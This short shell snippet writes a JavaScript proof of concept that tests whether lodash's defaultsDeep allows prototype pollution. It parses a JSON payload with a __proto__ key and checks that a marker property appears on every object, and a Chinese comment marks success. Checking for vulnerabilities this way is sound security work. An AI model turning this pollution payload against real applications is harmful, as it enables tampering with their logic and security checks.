cat > poc.js <<'EOF'
const lodash = require('lodash');
const malicious_payload = '{"__proto__":{"vulnerable":true}}';
const obj = JSON.parse(malicious_payload);
lodash.defaultsDeep({}, obj);
console.log('vulnerable' in {});   // true 就说明污染成功
EOF